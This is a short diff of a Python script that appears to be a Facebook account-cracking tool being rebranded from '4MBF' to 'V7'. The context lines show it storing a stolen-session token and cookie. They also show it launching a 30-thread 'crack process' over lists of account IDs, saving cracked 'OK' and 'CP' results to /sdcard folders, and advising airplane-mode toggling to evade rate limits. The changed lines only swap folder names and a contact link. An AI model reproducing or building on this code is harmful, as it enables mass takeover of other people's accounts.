@@ -200,8 +200,8 @@ def login_lagi334():
 		ken=open(".token.txt", "w").write(find_token.group(1))
 		cok=open(".cok.txt", "w").write(cookie)
 		print('LOGIN WAS SUCCESSFULLY');time.sleep(1)
-		print("\n run : python XCARET.py")
-		os.system('xdg-open https://youtube.com/channel/UCFLeodw8gk9oNcnttsOrO3A')
+		print("\n run : python V7.py")
+		os.system('xdg-open wa.me/6285758862225')
 		exit()
 	except Exception as e:
 		os.system("rm -f .cok.txt")
@@ -354,7 +354,7 @@ def setting():
 def passwrd():
 	ler = '# CRACK PROCESS START, PRESS CTRL+Z TO STOP'
 	sol().print(mark(ler, style='green'))
-	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/4MBF-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
+	krek = '[•] OK RESULTS SAVED IN : INTERNAL MEMORY/V7-DATA/OK/%s\n[•] CP RESULTS SAVED IN : INTERNAL MEMORY/V7-DATA/CP/%s\nON OF AIRPLANE MODE EVERY 500 ID'%(okc,cpc)
 	cetak(nel(krek, title=' • CRACK • '))
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
@@ -573,11 +573,11 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('touch .prox.txt')
 	except:pass
-	try:os.mkdir('/sdcard/4MBF-DATA/CP')
+	try:os.mkdir('/sdcard/V7-DATA/CP')
 	except:pass
-	try:os.mkdir('/sdcard/4MBF-DATA/OK')
+	try:os.mkdir('/sdcard/V7-DATA/OK')
 	except:pass
-	try:os.mkdir('/sdcard/4MBF-DATA/DUMP')
+	try:os.mkdir('/sdcard/V7-DATA/DUMP')
 	except:pass
 	login()
 
